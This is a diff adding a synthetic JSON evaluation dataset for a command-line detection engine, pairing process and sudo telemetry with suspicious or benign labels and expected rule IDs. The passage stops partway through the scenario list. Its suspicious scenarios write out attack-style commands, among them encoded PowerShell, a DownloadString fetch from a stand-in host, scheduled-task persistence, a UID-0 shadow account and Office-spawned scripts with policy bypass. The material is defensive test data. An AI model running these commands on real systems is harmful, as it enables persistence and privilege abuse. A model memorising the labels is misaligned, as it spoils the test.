@@ -1,0 +1,1097 @@
+{
+  "schema_version": 1,
+  "name": "SentinelForge command semantics challenge",
+  "version": "3.0.0",
+  "partition": "development",
+  "evaluation_time": "2026-11-16T12:00:00Z",
+  "baseline_revision": "88bcda800bb877cd1e354301e7b727953157d962",
+  "provenance": "Separately authored synthetic scenarios, never captured operational telemetry",
+  "labeling_criteria": "Assigned action intent is explicit in reason; expected_rule_ids describe prespecified semantic contracts and need not agree with intent. Labels never enter telemetry.",
+  "independence": "All partitions authored and frozen before v3 detector evaluation. Shared rule domains, constructor code and engineer authorship create correlation; this is not blinded, independent operational validation.",
+  "selection_plan": {
+    "scenarios": 40,
+    "positive": 20,
+    "negative": 20,
+    "unobservable_positive": 2,
+    "authorized_alertable_negative": 3,
+    "chosen_before_target_results": true
+  },
+  "scenarios": [
+    {
+      "id": "v3-development-encoded-full",
+      "origin_template": "dev-encoded-spelling",
+      "session_id": "v3-development-session-01",
+      "suspicious": true,
+      "reason": "Assigned malicious encoded execution; full engine option and inert stand-in content.",
+      "observability": "supported",
+      "expected_rule_ids": [
+        "00000000-0000-0000-0000-000000000002"
+      ],
+      "events": [
+        {
+          "source": "synthetic",
+          "sensor": "v3-development-sensor-01",
+          "payload": {
+            "host": "v3-development-01.lab.invalid",
+            "timestamp": "2026-11-16T09:00:00Z",
+            "kind": "process",
+            "user": "lab\\analyst-development",
+            "process": "C:\\Program Files\\PowerShell\\7\\pwsh.exe",
+            "command": "pwsh.exe -NoProfile -EncodedCommand VwByAGkAdABlAC0ATwB1AHQAcAB1AHQAIAAnAGQAZQB2AC0AYQAnAA==",
+            "external_id": "v3-development-01"
+          }
+        }
+      ],
+      "context": {}
+    },
+    {
+      "id": "v3-development-encoded-short-e",
+      "origin_template": "dev-encoded-spelling",
+      "session_id": "v3-development-session-02",
+      "suspicious": true,
+      "reason": "Assigned malicious encoded execution through the documented short e option.",
+      "observability": "supported",
+      "expected_rule_ids": [
+        "00000000-0000-0000-0000-000000000002"
+      ],
+      "events": [
+        {
+          "source": "synthetic",
+          "sensor": "v3-development-sensor-02",
+          "payload": {
+            "host": "v3-development-02.lab.invalid",
+            "timestamp": "2026-11-16T09:00:00Z",
+            "kind": "process",
+            "user": "lab\\analyst-development",
+            "process": "C:\\Program Files\\PowerShell\\7\\pwsh.exe",
+            "command": "pwsh.exe -e VwByAGkAdABlAC0ATwB1AHQAcAB1AHQAIAAnAGQAZQB2AC0AYgAnAA==",
+            "external_id": "v3-development-02"
+          }
+        }
+      ],
+      "context": {}
+    },
+    {
+      "id": "v3-development-encoded-short-ec",
+      "origin_template": "dev-encoded-spelling",
+      "session_id": "v3-development-session-03",
+      "suspicious": true,
+      "reason": "Assigned malicious encoded execution through the documented ec alias.",
+      "observability": "supported",
+      "expected_rule_ids": [
+        "00000000-0000-0000-0000-000000000002"
+      ],
+      "events": [
+        {
+          "source": "synthetic",
+          "sensor": "v3-development-sensor-03",
+          "payload": {
+            "host": "v3-development-03.lab.invalid",
+            "timestamp": "2026-11-16T09:00:00Z",
+            "kind": "process",
+            "user": "lab\\analyst-development",
+            "process": "C:\\Program Files\\PowerShell\\7\\pwsh.exe",
+            "command": "pwsh.exe -ec VwByAGkAdABlAC0ATwB1AHQAcAB1AHQAIAAnAGQAZQB2AC0AYwAnAA==",
+            "external_id": "v3-development-03"
+          }
+        }
+      ],
+      "context": {}
+    },
+    {
+      "id": "v3-development-inline-download",
+      "origin_template": "dev-inline-markers",
+      "session_id": "v3-development-session-04",
+      "suspicious": true,
+      "reason": "Assigned unapproved payload retrieval; inline download marker is observable.",
+      "observability": "supported",
+      "expected_rule_ids": [
+        "00000000-0000-0000-0000-000000000002"
+      ],
+      "events": [
+        {
+          "source": "synthetic",
+          "sensor": "v3-development-sensor-04",
+          "payload": {
+            "host": "v3-development-04.lab.invalid",
+            "timestamp": "2026-11-16T09:00:00Z",
+            "kind": "process",
+            "user": "lab\\analyst-development",
+            "process": "C:\\Program Files\\PowerShell\\7\\pwsh.exe",
+            "command": "pwsh.exe -Command \"(New-Object Net.WebClient).DownloadString('https://stage.invalid/a')\"",
+            "external_id": "v3-development-04"
+          }
+        }
+      ],
+      "context": {}
+    },
+    {
+      "id": "v3-development-inline-decode",
+      "origin_template": "dev-inline-markers",
+      "session_id": "v3-development-session-05",
+      "suspicious": true,
+      "reason": "Assigned malicious inline decoding; inert string preserves the declared heuristic.",
+      "observability": "supported",
+      "expected_rule_ids": [
+        "00000000-0000-0000-0000-000000000002"
+      ],
+      "events": [
+        {
+          "source": "synthetic",
+          "sensor": "v3-development-sensor-05",
+          "payload": {
+            "host": "v3-development-05.lab.invalid",
+            "timestamp": "2026-11-16T09:00:00Z",
+            "kind": "process",
+            "user": "lab\\analyst-development",
+            "process": "C:\\Program Files\\PowerShell\\7\\pwsh.exe",
+            "command": "pwsh.exe -Command \"[Convert]::FromBase64String('ZGV2')\"",
+            "external_id": "v3-development-05"
+          }
+        }
+      ],
+      "context": {}
+    },
+    {
+      "id": "v3-development-task-daily",
+      "origin_template": "dev-create-local",
+      "session_id": "v3-development-session-06",
+      "suspicious": true,
+      "reason": "Assigned unauthorized persistence through an actual create verb.",
+      "observability": "supported",
+      "expected_rule_ids": [
+        "00000000-0000-0000-0000-000000000004"
+      ],
+      "events": [
+        {
+          "source": "sysmon",
+          "sensor": "v3-development-sensor-06",
+          "payload": {
+            "EventID": 1,
+            "UtcTime": "2026-11-16T09:00:00Z",
+            "Computer": "v3-development-06.lab.invalid",
+            "User": "lab\\analyst-development",
+            "Image": "C:\\Windows\\System32\\schtasks.exe",
+            "CommandLine": "schtasks.exe /Create /SC DAILY /TN \"Telemetry Intake\" /TR \"C:\\Stage\\intake.exe\"",
+            "RecordID": "v3-development-06"
+          }
+        }
+      ],
+      "context": {}
+    },
+    {
+      "id": "v3-development-task-onlogon",
+      "origin_template": "dev-create-local",
+      "session_id": "v3-development-session-07",
+      "suspicious": true,
+      "reason": "Assigned unauthorized logon persistence; case-insensitive verb.",
+      "observability": "supported",
+      "expected_rule_ids": [
+        "00000000-0000-0000-0000-000000000004"
+      ],
+      "events": [
+        {
+          "source": "sysmon",
+          "sensor": "v3-development-sensor-07",
+          "payload": {
+            "EventID": 1,
+            "UtcTime": "2026-11-16T09:00:00Z",
+            "Computer": "v3-development-07.lab.invalid",
+            "User": "lab\\analyst-development",
+            "Image": "C:\\Windows\\System32\\schtasks.exe",
+            "CommandLine": "schtasks.exe /CREATE /SC ONLOGON /TN \"Session Resume\" /TR \"C:\\Stage\\resume.exe\" /F",
+            "RecordID": "v3-development-07"
+          }
+        }
+      ],
+      "context": {}
+    },
+    {
+      "id": "v3-development-task-xml",
+      "origin_template": "dev-create-local",
+      "session_id": "v3-development-session-08",
+      "suspicious": true,
+      "reason": "Assigned malicious imported task; command evidences creation attempt, not success.",
+      "observability": "supported",
+      "expected_rule_ids": [
+        "00000000-0000-0000-0000-000000000004"
+      ],
+      "events": [
+        {
+          "source": "sysmon",
+          "sensor": "v3-development-sensor-08",
+          "payload": {
+            "EventID": 1,
+            "UtcTime": "2026-11-16T09:00:00Z",
+            "Computer": "v3-development-08.lab.invalid",
+            "User": "lab\\analyst-development",
+            "Image": "C:\\Windows\\System32\\schtasks.exe",
+            "CommandLine": "schtasks.exe /Create /XML \"C:\\Stage\\job.xml\" /TN \"Imported Job\"",
+            "RecordID": "v3-development-08"
+          }
+        }
+      ],
+      "context": {}
+    },
+    {
+      "id": "v3-development-uid-separated",
+      "origin_template": "dev-uid-explicit",
+      "session_id": "v3-development-session-09",
+      "suspicious": true,
+      "reason": "Assigned unauthorized root-equivalent account attempt using separated UID value.",
+      "observability": "supported",
+      "expected_rule_ids": [
+        "00000000-0000-0000-0000-000000000005"
+      ],
+      "events": [
+        {
+          "source": "synthetic",
+          "sensor": "v3-development-sensor-09",
+          "payload": {
+            "host": "v3-development-09.lab.invalid",
+            "timestamp": "2026-11-16T09:00:00Z",
+            "kind": "process",
+            "user": "lab\\analyst-development",
+            "process": "/usr/sbin/useradd",
+            "command": "/usr/sbin/useradd -o -u 0 recovery_shadow",
+            "external_id": "v3-development-09"
+          }
+        }
+      ],
+      "context": {}
+    },
+    {
+      "id": "v3-development-uid-attached",
+      "origin_template": "dev-uid-explicit",
+      "session_id": "v3-development-session-10",
+      "suspicious": true,
+      "reason": "Assigned unauthorized UID-zero attempt with attached short argument.",
+      "observability": "supported",
+      "expected_rule_ids": [
+        "00000000-0000-0000-0000-000000000005"
+      ],
+      "events": [
+        {
+          "source": "synthetic",
+          "sensor": "v3-development-sensor-10",
+          "payload": {
+            "host": "v3-development-10.lab.invalid",
+            "timestamp": "2026-11-16T09:00:00Z",
+            "kind": "process",
+            "user": "lab\\analyst-development",
+            "process": "/usr/sbin/useradd",
+            "command": "/usr/sbin/useradd -N -o -u0 observer_shadow",
+            "external_id": "v3-development-10"
+          }
+        }
+      ],
+      "context": {}
+    },
+    {
+      "id": "v3-development-uid-long-equals",
+      "origin_template": "dev-uid-explicit",
+      "session_id": "v3-development-session-11",
+      "suspicious": true,
+      "reason": "Assigned unauthorized UID-zero attempt with exact long option.",
+      "observability": "supported",
+      "expected_rule_ids": [
+        "00000000-0000-0000-0000-000000000005"
+      ],
+      "events": [
+        {
+          "source": "synthetic",
+          "sensor": "v3-development-sensor-11",
+          "payload": {
+            "host": "v3-development-11.lab.invalid",
+            "timestamp": "2026-11-16T09:00:00Z",
+            "kind": "process",
+            "user": "lab\\analyst-development",
+            "process": "/usr/sbin/useradd",
+            "command": "/usr/sbin/useradd --non-unique --uid=0 svc_shadow",
+            "external_id": "v3-development-11"
+          }
+        }
+      ],
+      "context": {}
+    },
+    {
+      "id": "v3-development-sudo-bash",
+      "origin_template": "dev-sudo-direct",
+      "session_id": "v3-development-session-12",
+      "suspicious": true,
+      "reason": "Assigned unauthorized root shell; the executed command is bash.",
+      "observability": "supported",
+      "expected_rule_ids": [
+        "00000000-0000-0000-0000-000000000006"
+      ],
+      "events": [
+        {
+          "source": "linux_auth",
+          "sensor": "v3-development-sensor-12",
+          "payload": "2026-11-16T09:00:00Z v3-development-12.lab.invalid sudo[1234]: analyst : TTY=pts/1 ; PWD=/srv/operations ; USER=root ; COMMAND=/bin/bash -c id"
+        }
+      ],
+      "context": {}
+    },
+    {
+      "id": "v3-development-sudo-sh",
+      "origin_template": "dev-sudo-direct",
+      "session_id": "v3-development-session-13",
+      "suspicious": true,
+      "reason": "Assigned unauthorized root shell; sh is the executable.",
+      "observability": "supported",
+      "expected_rule_ids": [
+        "00000000-0000-0000-0000-000000000006"
+      ],
+      "events": [
+        {
+          "source": "linux_auth",
+          "sensor": "v3-development-sensor-13",
+          "payload": "2026-11-16T09:00:00Z v3-development-13.lab.invalid sudo[1234]: analyst : TTY=pts/1 ; PWD=/srv/operations ; USER=root ; COMMAND=/bin/sh -c whoami"
+        }
+      ],
+      "context": {}
+    },
+    {
+      "id": "v3-development-sudo-zsh",
+      "origin_template": "dev-sudo-direct",
+      "session_id": "v3-development-session-14",
+      "suspicious": true,
+      "reason": "Assigned unauthorized root shell; zsh is the executable.",
+      "observability": "supported",
+      "expected_rule_ids": [
+        "00000000-0000-0000-0000-000000000006"
+      ],
+      "events": [
+        {
+          "source": "linux_auth",
+          "sensor": "v3-development-sensor-14",
+          "payload": "2026-11-16T09:00:00Z v3-development-14.lab.invalid sudo[1234]: analyst : TTY=pts/1 ; PWD=/srv/operations ; USER=root ; COMMAND=/usr/bin/zsh -c pwd"
+        }
+      ],
+      "context": {}
+    },
+    {
+      "id": "v3-development-office-bypass",
+      "origin_template": "dev-office-file",
+      "session_id": "v3-development-session-15",
+      "suspicious": true,
+      "reason": "Assigned malicious document child; bypass precedes the File boundary.",
+      "observability": "supported",
+      "expected_rule_ids": [
+        "00000000-0000-0000-0000-000000000008"
+      ],
+      "events": [
+        {
+          "source": "synthetic",
+          "sensor": "v3-development-sensor-15",
+          "payload": {
+            "host": "v3-development-15.lab.invalid",
+            "timestamp": "2026-11-16T09:00:00Z",
+            "kind": "process",
+            "user": "lab\\analyst-development",
+            "process": "C:\\Program Files\\PowerShell\\7\\pwsh.exe",
+            "command": "pwsh.exe -ExecutionPolicy Bypass -File \"C:\\Stage\\invoice.ps1\"",
+            "external_id": "v3-development-15",
+            "parent": "C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE"
+          }
+        }
+      ],
+      "context": {}
+    },
+    {
+      "id": "v3-development-office-hidden",
+      "origin_template": "dev-office-file",
+      "session_id": "v3-development-session-16",
+      "suspicious": true,
+      "reason": "Assigned malicious spreadsheet child; hidden engine window precedes File.",
+      "observability": "supported",
+      "expected_rule_ids": [
+        "00000000-0000-0000-0000-000000000008"
+      ],
+      "events": [
+        {
+          "source": "synthetic",
+          "sensor": "v3-development-sensor-16",
+          "payload": {
+            "host": "v3-development-16.lab.invalid",
+            "timestamp": "2026-11-16T09:00:00Z",
+            "kind": "process",
+            "user": "lab\\analyst-development",
+            "process": "C:\\Program Files\\PowerShell\\7\\pwsh.exe",
+            "command": "pwsh.exe -WindowStyle Hidden -File \"C:\\Stage\\sheet.ps1\"",
+            "external_id": "v3-development-16",
+            "parent": "C:\\Program Files\\Microsoft Office\\root\\Office16\\EXCEL.EXE"
+          }
+        }
+      ],
+      "context": {}
+    },
+    {
+      "id": "v3-development-script-digest",
+      "origin_template": "dev-script-exact",
+      "session_id": "v3-development-session-17",
+      "suspicious": true,
+      "reason": "Assigned malicious script; exact observed path and active digest are collector-bound.",
+      "observability": "supported",
+      "expected_rule_ids": [
+        "00000000-0000-0000-0000-000000000008"
+      ],
+      "events": [
+        {
+          "source": "synthetic",
+          "sensor": "v3-development-sensor-17",
+          "payload": {
+            "host": "v3-development-17.lab.invalid",
+            "timestamp": "2026-11-16T09:00:00Z",
+            "kind": "process",
+            "user": "lab\\analyst-development",
+            "process": "C:\\Program Files\\PowerShell\\7\\pwsh.exe",
+            "command": "pwsh.exe -File \"C:\\Stage\\sync.ps1\"",
+            "external_id": "v3-development-17",
+            "fields": {
+              "script_path": "C:\\Stage\\sync.ps1",
+              "script_sha256": "edb509c6fa4e81643ec1d856bdcae743287b4704d716699311d1c818e2d56147"
+            }
+          }
+        }
+      ],
+      "context": {
+        "bindings": [
+          {
+            "key": "collector",
+            "principal": "evaluation",
+            "source": "synthetic",
+            "sensor": "v3-development-sensor-17",
+            "host": "v3-development-17.lab.invalid",
+            "expires_at": "2026-11-17T00:00:00Z",
+            "reason": "Synthetic collector enrollment for scoped script observation"
+          }
+        ],
+        "indicators": [
+          {
+            "kind": "sha256",
+            "value": "edb509c6fa4e81643ec1d856bdcae743287b4704d716699311d1c818e2d56147",
+            "purpose": "powershell-script",
+            "version": "v3-development-script-digest",
+            "provenance": "Engineer-authored synthetic intelligence; no external reputation claim",
+            "valid_from": "2026-11-16T00:00:00Z",
+            "valid_until": "2026-11-17T00:00:00Z",
+            "expires_at": "2026-11-17T00:00:00Z",
+            "reason": "Synthetic investigation established this exact content digest"
+          }
+        ]
+      }
+    },
+    {
+      "id": "v3-development-renamed-office",
+      "origin_template": "dev-renamed-original",
+      "session_id": "v3-development-session-18",
+      "suspicious": true,
+      "reason": "Assigned malicious renamed PowerShell; original filename and document parent are observed.",
+      "observability": "supported",
+      "expected_rule_ids": [
+        "00000000-0000-0000-0000-000000000008"
+      ],
+      "events": [
+        {
+          "source": "sysmon",
+          "sensor": "v3-development-sensor-18",
+          "payload": {
+            "EventID": 1,
+            "UtcTime": "2026-11-16T09:00:00Z",
+            "Computer": "v3-development-18.lab.invalid",
+            "User": "lab\\analyst-development",
+            "Image": "C:\\Stage\\worker.exe",
+            "CommandLine": "pwsh.exe -ep Bypass -File \"C:\\Stage\\notice.ps1\"",
+            "RecordID": "v3-development-18",
+            "ParentImage": "C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE",
+            "OriginalFileName": "pwsh.exe"
+          }
+        }
+      ],
+      "context": {}
+    },
+    {
+      "id": "v3-development-hidden-script-intent",
+      "origin_template": "dev-unobservable-content",
+      "session_id": "v3-development-session-19",
+      "suspicious": true,
+      "reason": "Assigned malicious script content is absent from telemetry; ordinary path alone cannot establish it.",
+      "observability": "unobservable",
+      "expected_rule_ids": [],
+      "events": [
+        {
+          "source": "synthetic",
+          "sensor": "v3-development-sensor-19",
+          "payload": {
+            "host": "v3-development-19.lab.invalid",
+            "timestamp": "2026-11-16T09:00:00Z",
+            "kind": "process",
+            "user": "lab\\analyst-development",
+            "process": "C:\\Program Files\\PowerShell\\7\\pwsh.exe",
+            "command": "pwsh.exe -File \"C:\\Ops\\refresh.ps1\"",
+            "external_id": "v3-development-19"
+          }
+        }
+      ],
+      "context": {}
+    },
+    {
+      "id": "v3-development-stdin-intent",
+      "origin_template": "dev-unobservable-content",
+      "session_id": "v3-development-session-20",
+      "suspicious": true,
+      "reason": "Assigned malicious standard-input program is not captured; command-line evidence cannot reveal it.",
+      "observability": "unobservable",
+      "expected_rule_ids": [],
+      "events": [
+        {
+          "source": "synthetic",
+          "sensor": "v3-development-sensor-20",
+          "payload": {
+            "host": "v3-development-20.lab.invalid",
+            "timestamp": "2026-11-16T09:00:00Z",
+            "kind": "process",
+            "user": "lab\\analyst-development",
+            "process": "C:\\Program Files\\PowerShell\\7\\pwsh.exe",
+            "command": "pwsh.exe -NoProfile -Command -",
+            "external_id": "v3-development-20"
+          }
+        }
+      ],
+      "context": {}
+    },
+    {
+      "id": "v3-development-pipe-value",
+      "origin_template": "dev-engine-value-boundary",
+      "session_id": "v3-development-session-21",
+      "suspicious": false,
+      "reason": "Authorized debugger endpoint name consumes the apparent encoded option as a value.",
+      "observability": "supported",
+      "expected_rule_ids": [],
+      "events": [
+        {
+          "source": "synthetic",
+          "sensor": "v3-development-sensor-21",
+          "payload": {
+            "host": "v3-development-21.lab.invalid",
+            "timestamp": "2026-11-16T09:00:00Z",
+            "kind": "process",
+            "user": "lab\\analyst-development",
+            "process": "C:\\Program Files\\PowerShell\\7\\pwsh.exe",
+            "command": "pwsh.exe -CustomPipeName \"-EncodedCommand\" -Command \"Write-Output ready\"",
+            "external_id": "v3-development-21"
+          }
+        }
+      ],
+      "context": {}
+    },
+    {
+      "id": "v3-development-configuration-value",
+      "origin_template": "dev-engine-value-boundary",
+      "session_id": "v3-development-session-22",
+      "suspicious": false,
+      "reason": "Authorized named endpoint value is not an encoded engine option.",
+      "observability": "supported",
+      "expected_rule_ids": [],
+      "events": [
+        {
+          "source": "synthetic",
+          "sensor": "v3-development-sensor-22",
+          "payload": {
+            "host": "v3-development-22.lab.invalid",
+            "timestamp": "2026-11-16T09:00:00Z",
+            "kind": "process",
+            "user": "lab\\analyst-development",
+            "process": "C:\\Program Files\\PowerShell\\7\\pwsh.exe",
+            "command": "pwsh.exe -ConfigurationName \"-enc\" -Command \"Get-Date\"",
+            "external_id": "v3-development-22"
+          }
+        }
+      ],
+      "context": {}
+    },
+    {
+      "id": "v3-development-script-encoded-argument",
+      "origin_template": "dev-file-arguments",
+      "session_id": "v3-development-session-23",
+      "suspicious": false,
+      "reason": "Authorized script parameter happens to share an engine parameter name; File ended engine parsing.",
+      "observability": "supported",
+      "expected_rule_ids": [],
+      "events": [
+        {
+          "source": "synthetic",
+          "sensor": "v3-development-sensor-23",
+          "payload": {
+            "host": "v3-development-23.lab.invalid",
+            "timestamp": "2026-11-16T09:00:00Z",
+            "kind": "process",
+            "user": "lab\\analyst-development",
+            "process": "C:\\Program Files\\PowerShell\\7\\pwsh.exe",
+            "command": "pwsh.exe -File \"C:\\Ops\\report.ps1\" -EncodedCommand \"report-id\"",
+            "external_id": "v3-development-23"
+          }
+        }
+      ],
+      "context": {}
+    },
+    {
+      "id": "v3-development-script-download-text",
+      "origin_template": "dev-file-arguments",
+      "session_id": "v3-development-session-24",
+      "suspicious": false,
+      "reason": "Authorized help generator receives a marker string as a script argument, not inline PowerShell code.",
+      "observability": "supported",
+      "expected_rule_ids": [],
+      "events": [
+        {
+          "source": "synthetic",
+          "sensor": "v3-development-sensor-24",
+          "payload": {
+            "host": "v3-development-24.lab.invalid",
+            "timestamp": "2026-11-16T09:00:00Z",
+            "kind": "process",
+            "user": "lab\\analyst-development",
+            "process": "C:\\Program Files\\PowerShell\\7\\pwsh.exe",
+            "command": "pwsh.exe -File \"C:\\Ops\\help.ps1\" -Example \"DownloadString\"",
+            "external_id": "v3-development-24"
+          }
+        }
+      ],
+      "context": {}
+    },
+    {
+      "id": "v3-development-task-query-name",
+      "origin_template": "dev-task-value-boundary",
+      "session_id": "v3-development-session-25",
+      "suspicious": false,
+      "reason": "Authorized query names an existing task containing a verb-like word.",
+      "observability": "supported",
+      "expected_rule_ids": [],
+      "events": [
+        {
+          "source": "sysmon",
+          "sensor": "v3-development-sensor-25",
+          "payload": {
+            "EventID": 1,
+            "UtcTime": "2026-11-16T09:00:00Z",
+            "Computer": "v3-development-25.lab.invalid",
+            "User": "lab\\analyst-development",
+            "Image": "C:\\Windows\\System32\\schtasks.exe",
+            "CommandLine": "schtasks.exe /Query /TN \"docs /create guide\" /FO LIST",
+            "RecordID": "v3-development-25"
+          }
+        }
+      ],
+      "context": {}
+    },
+    {
+      "id": "v3-development-task-change-action",
+      "origin_template": "dev-task-value-boundary",
+      "session_id": "v3-development-session-26",
+      "suspicious": false,
+      "reason": "Authorized task modification includes create in its action; no create verb is executed.",
+      "observability": "supported",
+      "expected_rule_ids": [],
+      "events": [
+        {
+          "source": "sysmon",
+          "sensor": "v3-development-sensor-26",
+          "payload": {
+            "EventID": 1,
+            "UtcTime": "2026-11-16T09:00:00Z",
+            "Computer": "v3-development-26.lab.invalid",
+            "User": "lab\\analyst-development",
+            "Image": "C:\\Windows\\System32\\schtasks.exe",
+            "CommandLine": "schtasks.exe /Change /TN \"Report\" /TR \"C:\\Ops\\report.exe /create\"",
+            "RecordID": "v3-development-26"
+          }
+        }
+      ],
+      "context": {}
+    },
+    {
+      "id": "v3-development-task-run-name",
+      "origin_template": "dev-task-value-boundary",
+      "session_id": "v3-development-session-27",
+      "suspicious": false,
+      "reason": "Authorized run of an existing task; task-name text is not a create command.",
+      "observability": "supported",
+      "expected_rule_ids": [],
+      "events": [
+        {
+          "source": "sysmon",
+          "sensor": "v3-development-sensor-27",
+          "payload": {
+            "EventID": 1,
+            "UtcTime": "2026-11-16T09:00:00Z",
+            "Computer": "v3-development-27.lab.invalid",
+            "User": "lab\\analyst-development",
+            "Image": "C:\\Windows\\System32\\schtasks.exe",
+            "CommandLine": "schtasks.exe /Run /TN \"Archive /create snapshot\"",
+            "RecordID": "v3-development-27"
+          }
+        }
+      ],
+      "context": {}
+    },
+    {
+      "id": "v3-development-uid-comment-separated",
+      "origin_template": "dev-uid-consumed-comment",
+      "session_id": "v3-development-session-28",
+      "suspicious": false,
+      "reason": "Authorized ordinary account; the zero-looking substring belongs to a comment.",
+      "observability": "supported",
+      "expected_rule_ids": [],
+      "events": [
+        {
+          "source": "synthetic",
+          "sensor": "v3-development-sensor-28",
+          "payload": {
+            "host": "v3-development-28.lab.invalid",
+            "timestamp": "2026-11-16T09:00:00Z",
+            "kind": "process",
+            "user": "lab\\analyst-development",
+            "process": "/usr/sbin/useradd",
+            "command": "/usr/sbin/useradd -c \"-u 0\" -u 1801 engineer",
+            "external_id": "v3-development-28"
+          }
+        }
+      ],
+      "context": {}
+    },
+    {
+      "id": "v3-development-uid-comment-token",
+      "origin_template": "dev-uid-consumed-comment",
+      "session_id": "v3-development-session-29",
+      "suspicious": false,
+      "reason": "Authorized account; the option-looking token is consumed by comment before the nonzero UID.",
+      "observability": "supported",
+      "expected_rule_ids": [],
+      "events": [
+        {
+          "source": "synthetic",
+          "sensor": "v3-development-sensor-29",
+          "payload": {
+            "host": "v3-development-29.lab.invalid",
+            "timestamp": "2026-11-16T09:00:00Z",
+            "kind": "process",
+            "user": "lab\\analyst-development",
+            "process": "/usr/sbin/useradd",
+            "command": "/usr/sbin/useradd -c -u0 -u 1802 operator",
+            "external_id": "v3-development-29"
+          }
+        }
+      ],
+      "context": {}
+    },
+    {
+      "id": "v3-development-uid-long-comment",
+      "origin_template": "dev-uid-consumed-comment",
+      "session_id": "v3-development-session-30",
+      "suspicious": false,
+      "reason": "Authorized account comment contains an apparent long UID option.",
+      "observability": "supported",
+      "expected_rule_ids": [],
+      "events": [
+        {
+          "source": "synthetic",
+          "sensor": "v3-development-sensor-30",
+          "payload": {
+            "host": "v3-development-30.lab.invalid",
+            "timestamp": "2026-11-16T09:00:00Z",
+            "kind": "process",
+            "user": "lab\\analyst-development",
+            "process": "/usr/sbin/useradd",
+            "command": "/usr/sbin/useradd --comment=\"--uid=0\" --uid=1803 auditor",
+            "external_id": "v3-development-30"
+          }
+        }
+      ],
+      "context": {}
+    },
+    {
+      "id": "v3-development-sudo-stat-shell",
+      "origin_template": "dev-sudo-data-arguments",
+      "session_id": "v3-development-session-31",
+      "suspicious": false,
+      "reason": "Authorized metadata inspection executes stat; a shell pathname is only its operand.",
+      "observability": "supported",
+      "expected_rule_ids": [],
+      "events": [
+        {
+          "source": "linux_auth",
+          "sensor": "v3-development-sensor-31",
+          "payload": "2026-11-16T09:00:00Z v3-development-31.lab.invalid sudo[1234]: analyst : TTY=pts/1 ; PWD=/srv/operations ; USER=root ; COMMAND=/usr/bin/stat /bin/bash"
+        }
+      ],
+      "context": {}
+    },
+    {
+      "id": "v3-development-sudo-cat-profile",
+      "origin_template": "dev-sudo-data-arguments",
+      "session_id": "v3-development-session-32",
+      "suspicious": false,
+      "reason": "Authorized file inspection; a path suffix resembling a shell is not the executable.",
+      "observability": "supported",
+      "expected_rule_ids": [],
+      "events": [
+        {
+          "source": "linux_auth",
+          "sensor": "v3-development-sensor-32",
+          "payload": "2026-11-16T09:00:00Z v3-development-32.lab.invalid sudo[1234]: analyst : TTY=pts/1 ; PWD=/srv/operations ; USER=root ; COMMAND=/usr/bin/cat /etc/profile.d/bin/sh"
+        }
+      ],
+      "context": {}
+    },
+    {
+      "id": "v3-development-sudo-print-shell",
+      "origin_template": "dev-sudo-data-arguments",
+      "session_id": "v3-development-session-33",
+      "suspicious": false,
+      "reason": "Authorized print operation; the shell path is data.",
+      "observability": "supported",
+      "expected_rule_ids": [],
+      "events": [
+        {
+          "source": "linux_auth",
+          "sensor": "v3-development-sensor-33",
+          "payload": "2026-11-16T09:00:00Z v3-development-33.lab.invalid sudo[1234]: analyst : TTY=pts/1 ; PWD=/srv/operations ; USER=root ; COMMAND=/usr/bin/printf '%s' /bin/zsh"
+        }
+      ],
+      "context": {}
+    },
+    {
+      "id": "v3-development-context-other-path",
+      "origin_template": "dev-context-path-scope",
+      "session_id": "v3-development-session-34",
+      "suspicious": false,
+      "reason": "Authorized clean file; collector hash belongs to a different observed path.",
+      "observability": "supported",
+      "expected_rule_ids": [],
+      "events": [
+        {
+          "source": "synthetic",
+          "sensor": "v3-development-sensor-34",
+          "payload": {
+            "host": "v3-development-34.lab.invalid",
+            "timestamp": "2026-11-16T09:00:00Z",
+            "kind": "process",
+            "user": "lab\\analyst-development",
+            "process": "C:\\Program Files\\PowerShell\\7\\pwsh.exe",
+            "command": "pwsh.exe -File \"C:\\Ops\\clean.ps1\"",
+            "external_id": "v3-development-34",
+            "fields": {
+              "script_path": "C:\\Stage\\different.ps1",
+              "script_sha256": "68cfab71bba8f180fe49365e9f50811b34b16304630ca61e3d21e87b76c15dbb"
+            }
+          }
+        }
+      ],
+      "context": {
+        "bindings": [
+          {
+            "key": "collector",
+            "principal": "evaluation",
+            "source": "synthetic",
+            "sensor": "v3-development-sensor-34",
+            "host": "v3-development-34.lab.invalid",
+            "expires_at": "2026-11-17T00:00:00Z",
+            "reason": "Synthetic collector enrollment for scoped script observation"
+          }
+        ],
+        "indicators": [
+          {
+            "kind": "sha256",
+            "value": "68cfab71bba8f180fe49365e9f50811b34b16304630ca61e3d21e87b76c15dbb",
+            "purpose": "powershell-script",
+            "version": "v3-development-context-other-path",
+            "provenance": "Engineer-authored synthetic intelligence; no external reputation claim",
+            "valid_from": "2026-11-16T00:00:00Z",
+            "valid_until": "2026-11-17T00:00:00Z",
+            "expires_at": "2026-11-17T00:00:00Z",
+            "reason": "Synthetic investigation established this exact content digest"
+          }
+        ]
+      }
+    },
+    {
+      "id": "v3-development-context-no-binding",
+      "origin_template": "dev-context-path-scope",
+      "session_id": "v3-development-session-35",
+      "suspicious": false,
+      "reason": "Authorized validation run; unbound synthetic digest cannot establish collector-attributed intelligence.",
+      "observability": "supported",
+      "expected_rule_ids": [],
+      "events": [
+        {
+          "source": "synthetic",
+          "sensor": "v3-development-sensor-35",
+          "payload": {
+            "host": "v3-development-35.lab.invalid",
+            "timestamp": "2026-11-16T09:00:00Z",
+            "kind": "process",
+            "user": "lab\\analyst-development",
+            "process": "C:\\Program Files\\PowerShell\\7\\pwsh.exe",
+            "command": "pwsh.exe -File \"C:\\Ops\\verify.ps1\"",
+            "external_id": "v3-development-35",
+            "fields": {
+              "script_path": "C:\\Ops\\verify.ps1",
+              "script_sha256": "111118aa620fef74cfbdb300a994e4bb0d47d5a0bb1aabbb6211dbf7aa3a956a"
+            }
+          }
+        }
+      ],
+      "context": {
+        "indicators": [
+          {
+            "kind": "sha256",
+            "value": "111118aa620fef74cfbdb300a994e4bb0d47d5a0bb1aabbb6211dbf7aa3a956a",
+            "purpose": "powershell-script",
+            "version": "v3-development-context-no-binding",
+            "provenance": "Engineer-authored synthetic intelligence; no external reputation claim",
+            "valid_from": "2026-11-16T00:00:00Z",
+            "valid_until": "2026-11-17T00:00:00Z",
+            "expires_at": "2026-11-17T00:00:00Z",
+            "reason": "Synthetic investigation established this exact content digest"
+          }
+        ]
+      }
+    },
+    {
